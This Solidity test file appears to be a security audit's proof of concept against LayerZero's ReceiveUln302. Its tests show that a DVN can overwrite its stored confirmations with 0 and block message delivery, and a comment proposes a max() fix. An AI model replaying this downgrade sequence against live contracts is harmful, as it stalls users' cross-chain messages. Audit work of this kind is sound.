// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { UlnConfig, SetDefaultUlnConfigParam } from "../../contracts/uln/UlnBase.sol";
import { ReceiveUln302 } from "../../contracts/uln/uln302/ReceiveUln302.sol";
import { ReceiveUlnBase } from "../../contracts/uln/ReceiveUlnBase.sol";
import { DVN } from "../../contracts/uln/dvn/DVN.sol";
import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
import { PacketV1Codec } from "@layerzerolabs/lz-evm-protocol-v2/contracts/messagelib/libs/PacketV1Codec.sol";
import { PacketUtil } from "../util/Packet.sol";
import { Constant } from "../util/Constant.sol";
import { AuditBase } from "./AuditBase.t.sol";

/// @title AV2 - MultiSig Signature Replay / Confirmation Downgrade
/// @notice Demonstrates that ReceiveUlnBase._verify() performs an unconditional overwrite of the
///         stored Verification struct. A DVN that previously verified with N confirmations can call
///         verify again with 0 confirmations, retracting its own approval and stalling delivery.
///
/// Root cause (ReceiveUlnBase.sol:44):
///   hashLookup[keccak256(_packetHeader)][_payloadHash][msg.sender] = Verification(true, _confirmations);
///
/// This is an overwrite, not a max(). The new value replaces the old one unconditionally.
///
/// Additionally, DVN._shouldCheckHash() returns false for the verify selector, meaning there is no
/// replay guard. A DVN can call verify() any number of times with any confirmation value.
///
/// Impact: Liveness attack. A single compromised DVN operator in a multi-DVN quorum, or the DVN
/// operator acting adversarially, can permanently stall message delivery for any packet by
/// downgrading their stored confirmations to 0 after all other conditions for delivery are met.
contract SignatureReplayTest is AuditBase {

    // ========================= AV2.1: Verify Overwrites Confirmations =========================

    /// @dev Proves that a second call to verify() with lower confirmations overwrites the first.
    ///      A DVN that approved with 15 confirmations can retract by resubmitting with 0.
    function test_AV2_1_VerifyOverwritesConfirmations() public {
        Packet memory packet = _makePacket(1, address(this), address(this), "av2-overwrite");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        bytes32 headerHash = keccak256(header);
        UlnConfig memory config = dstReceiveUln.getUlnConfig(address(this), SRC_EID);

        // Step 1: DVN verifies with 15 confirmations (well above the required 1).
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 15);

        // Step 2: Confirm the message is verifiable (15 >= 1 required).
        assertTrue(
            dstReceiveUln.verifiable(config, headerHash, payloadHash),
            "Should be verifiable after 15-confirmation verify"
        );

        // Step 3: Inspect stored confirmations directly - should be 15.
        (bool v1Submitted, uint64 v1Confirmations) = dstReceiveUln.hashLookup(headerHash, payloadHash, address(dstDvn));
        assertTrue(v1Submitted, "DVN should be marked as submitted");
        assertEq(v1Confirmations, 15, "Stored confirmations should be 15");

        // Step 4: DVN calls verify AGAIN with 0 confirmations (the downgrade / retraction).
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        // Step 5: The stored value is now 0 - not max(15, 0) = 15.
        (bool v2Submitted, uint64 v2Confirmations) = dstReceiveUln.hashLookup(headerHash, payloadHash, address(dstDvn));
        assertTrue(v2Submitted, "DVN should still be marked as submitted");
        assertEq(v2Confirmations, 0, "Stored confirmations should be 0 after overwrite");

        // Step 6: The message is no longer verifiable - 0 < 1 required.
        assertFalse(
            dstReceiveUln.verifiable(config, headerHash, payloadHash),
            "Should NOT be verifiable after confirmations downgraded to 0"
        );
    }

    // ========================= AV2.2: Confirmation Downgrade Blocks Delivery =========================

    /// @dev Proves the real-world impact: a DVN approves a packet, then retracts before
    ///      commitVerification is called. The transaction to deliver the message reverts.
    function test_AV2_2_ConfirmationDowngradeBlocksDelivery() public {
        Packet memory packet = _makePacket(2, address(this), address(this), "av2-block-delivery");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        bytes32 headerHash = keccak256(header);
        UlnConfig memory config = dstReceiveUln.getUlnConfig(address(this), SRC_EID);

        // Step 1: DVN verifies with 100 confirmations - well above requirement.
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 100);

        // Step 2: Confirm the packet would be committable at this point.
        assertTrue(
            dstReceiveUln.verifiable(config, headerHash, payloadHash),
            "Should be verifiable with 100 confirmations"
        );

        // Step 3: DVN operator (adversarially or via compromise) calls verify again with 0.
        //         No replay guard prevents this. The overwrite succeeds silently.
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        // Step 4: The packet is no longer committable.
        assertFalse(
            dstReceiveUln.verifiable(config, headerHash, payloadHash),
            "Should NOT be verifiable after downgrade to 0"
        );

        // Step 5: Attempting commitVerification reverts with LZ_ULN_Verifying.
        //         The message is stalled indefinitely unless the DVN re-verifies with sufficient
        //         confirmations - which is entirely under the DVN operator's control.
        vm.expectRevert(abi.encodeWithSignature("LZ_ULN_Verifying()"));
        _commitVerification(dstReceiveUln, header, payloadHash);
    }

    // ========================= AV2.3: Verify Can Be Called Repeatedly (No Replay Guard) =========================

    /// @dev Proves that verify() has no replay protection. A DVN may call it arbitrarily many
    ///      times with any confirmation value, toggling verifiability on and off at will.
    function test_AV2_3_VerifyCanBeCalledRepeatedly() public {
        Packet memory packet = _makePacket(3, address(this), address(this), "av2-no-replay-guard");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        bytes32 headerHash = keccak256(header);
        UlnConfig memory config = dstReceiveUln.getUlnConfig(address(this), SRC_EID);

        // Round 1: verify with 1 - should be verifiable.
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);
        assertTrue(
            dstReceiveUln.verifiable(config, headerHash, payloadHash),
            "Round 1: should be verifiable (confirmations=1)"
        );

        // Round 2: verify with 5 - still verifiable, now with higher confirmations.
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 5);
        assertTrue(
            dstReceiveUln.verifiable(config, headerHash, payloadHash),
            "Round 2: should be verifiable (confirmations=5)"
        );
        {
            (, uint64 storedConf2) = dstReceiveUln.hashLookup(headerHash, payloadHash, address(dstDvn));
            assertEq(storedConf2, 5, "Round 2: stored confirmations should be 5");
        }

        // Round 3: verify with 0 - no longer verifiable (downgrade / retraction).
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);
        assertFalse(
            dstReceiveUln.verifiable(config, headerHash, payloadHash),
            "Round 3: should NOT be verifiable (confirmations=0)"
        );

        // Round 4: verify with 10 - verifiable again (DVN can re-approve).
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 10);
        assertTrue(
            dstReceiveUln.verifiable(config, headerHash, payloadHash),
            "Round 4: should be verifiable again (confirmations=10)"
        );
        {
            (, uint64 storedConf4) = dstReceiveUln.hashLookup(headerHash, payloadHash, address(dstDvn));
            assertEq(storedConf4, 10, "Round 4: stored confirmations should be 10");
        }

        // This sequence demonstrates: no nonce, no cooldown, no replay protection of any kind.
        // The DVN can flip the message's verifiability state an unlimited number of times.
    }

    // ========================= AV2.4: Downgrade After Partial Quorum (2-DVN Config) =========================

    /// @dev Proves the attack in a 2-DVN quorum scenario:
    ///      DVN1 approves → DVN1 downgrades → DVN2 approves → quorum still not met.
    ///      A single DVN operator can veto delivery in any N-of-M quorum by retracting.
    function test_AV2_4_ConfirmationDowngradeAfterPartialQuorum() public {
        // Use a bare address as a second DVN - no contract needed since verify() only
        // checks msg.sender and writes to storage.
        address dvn2 = address(0x2222);

        // Build a 2-required-DVN config for SRC_EID on the dst receive ULN.
        address[] memory requiredDvns = new address[](2);
        // ULN config requires requiredDVNs to be sorted in ascending address order.
        if (uint160(address(dstDvn)) < uint160(dvn2)) {
            requiredDvns[0] = address(dstDvn);
            requiredDvns[1] = dvn2;
        } else {
            requiredDvns[0] = dvn2;
            requiredDvns[1] = address(dstDvn);
        }

        SetDefaultUlnConfigParam[] memory params = new SetDefaultUlnConfigParam[](1);
        params[0] = SetDefaultUlnConfigParam({
            eid: SRC_EID,
            config: UlnConfig({
                confirmations: 1,
                requiredDVNCount: 2,
                optionalDVNCount: 0,
                optionalDVNThreshold: 0,
                requiredDVNs: requiredDvns,
                optionalDVNs: new address[](0)
            })
        });
        dstReceiveUln.setDefaultUlnConfigs(params);

        Packet memory packet = _makePacket(4, address(this), address(this), "av2-2dvn-quorum");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        bytes32 headerHash = keccak256(header);
        UlnConfig memory config = dstReceiveUln.getUlnConfig(address(this), SRC_EID);

        // Confirm the updated config is active.
        assertEq(config.requiredDVNCount, 2, "Config should require 2 DVNs");

        // Step 1: DVN1 (dstDvn) verifies with sufficient confirmations.
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);

        // Only 1 of 2 DVNs have signed - not yet verifiable.
        assertFalse(
            dstReceiveUln.verifiable(config, headerHash, payloadHash),
            "Should NOT be verifiable with only DVN1 signed"
        );

        // Step 2: Before DVN2 signs, DVN1 downgrades to 0 confirmations (retraction).
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        (, uint64 v1AfterConf) = dstReceiveUln.hashLookup(headerHash, payloadHash, address(dstDvn));
        assertEq(v1AfterConf, 0, "DVN1 confirmations should be 0 after retraction");

        // Step 3: DVN2 verifies with sufficient confirmations.
        vm.prank(dvn2);
        dstReceiveUln.verify(header, payloadHash, 1);

        (bool v2Sub, uint64 v2Conf) = dstReceiveUln.hashLookup(headerHash, payloadHash, dvn2);
        assertTrue(v2Sub, "DVN2 should be marked submitted");
        assertEq(v2Conf, 1, "DVN2 confirmations should be 1");

        // Step 4: Quorum is still NOT met because DVN1's entry shows 0 confirmations.
        //         Both DVNs must satisfy confirmations >= config.confirmations (1).
        //         DVN1 has 0, so _verified(dvn1, ..., 1) returns false.
        assertFalse(
            dstReceiveUln.verifiable(config, headerHash, payloadHash),
            "Should NOT be verifiable: DVN1 retracted, quorum not met"
        );

        // Step 5: commitVerification reverts - the message cannot be delivered.
        vm.expectRevert(abi.encodeWithSignature("LZ_ULN_Verifying()"));
        _commitVerification(dstReceiveUln, header, payloadHash);
    }

    // ========================= AV2.5: Verify Does Not Take Max =========================

    /// @dev Explicitly proves via storage inspection that _verify() stores the latest value,
    ///      not max(previous, new). This is the root cause of all preceding findings.
    function test_AV2_5_VerifyOverwriteIsNotMax() public {
        Packet memory packet = _makePacket(5, address(this), address(this), "av2-not-max");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        bytes32 headerHash = keccak256(header);

        // Verify with a high value first.
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 100);

        (, uint64 after100Conf) = dstReceiveUln.hashLookup(headerHash, payloadHash, address(dstDvn));
        assertEq(after100Conf, 100, "Stored value should be 100 after first verify");

        // Verify again with a lower value.
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);

        (, uint64 after1Conf) = dstReceiveUln.hashLookup(headerHash, payloadHash, address(dstDvn));

        // If _verify() took the max, the stored value would still be 100.
        // The actual stored value is 1, proving this is a plain overwrite.
        assertEq(after1Conf, 1, "Stored value is 1 - _verify() overwrites, it does NOT take max(100, 1)");
        assertNotEq(after1Conf, 100, "Stored value is NOT 100 - confirms the absence of a max() guard");

        // Now downgrade all the way to 0.
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        (, uint64 after0Conf) = dstReceiveUln.hashLookup(headerHash, payloadHash, address(dstDvn));
        assertEq(after0Conf, 0, "Stored value is 0 after final overwrite");

        // The fix would be:
        //   hashLookup[...][...][msg.sender].confirmations =
        //       _confirmations > existing.confirmations ? _confirmations : existing.confirmations;
        // or equivalently:
        //   if (_confirmations > existing.confirmations) { ... = Verification(true, _confirmations); }
    }
}
